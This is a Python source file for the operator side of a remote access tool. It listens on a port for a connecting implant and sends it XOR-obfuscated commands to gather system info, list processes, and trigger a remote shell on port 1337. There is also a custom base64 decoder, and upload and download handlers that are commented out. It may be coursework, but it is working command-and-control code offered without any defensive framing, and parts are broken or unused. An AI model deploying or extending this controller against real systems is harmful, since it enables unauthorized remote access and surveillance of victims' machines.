import socket
import os
import string
import base64

HOST = '0.0.0.0'
PORT = 1234

def customb64(xored):
    print("which is: " + xored)
    cust = "uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8"
    b64 =  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    new64 = str.maketrans(cust, b64)
    result = xored.translate(new64)

    result += '='
    return base64.decodestring(result)
    

def xor(command):
    # xor part
    xored = ''
    # print("Command: " + command.decode('utf-8'))
    for char in command:
        print(char)
        xored += chr(ord(char) ^ 0x89)
        print(xored)
    xored += chr(0)
    return xored


def main():
    # Start listening
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(3)
    print("Listening for connection")
    conn, addr = s.accept()

    while(True):
        command = input("476-1337 >>> ")
        if command == "exit":
            print("Peace out bro....")
            # s.close()
            exit()
        elif command == "help":
            print('''Here are the available commands: \ninfo: Get general information about the target \nlp: List all running process \nupload <source> <destination>: source is u, destination is where you wanna save it \ndownload <filename>: filename should be the absolute path''')
        elif command == "info":
            print("Getting info from target")
            result = xor(command)
            conn.send(result.encode())
        # elif command == "upload":
        #     # Ask for source and destination from here
        #     print("Upload your file")
        #     file = input("What file do you want to upload: ")
        #     with open(file, 'rb') as f:
        #         conte = f.read()
        #         print(conte)
        #         conn.send(xor(conte).encode('utf-8'))
        # elif command == "download":
        #     # Get the file name from here
        #     print("Downloading file to current directory")
        elif command == "lp":
            print("Listing process....")
            result = xor(command)
            conn.send(result.encode())
        elif command == "shell":
            # I will have port 1337 open for this
            print("Receiving a shell on port 1337")
            result = xor(command)
            conn.send(result.encode())
        else:
            print("Command not found!!!")


if __name__ == "__main__":
    main()
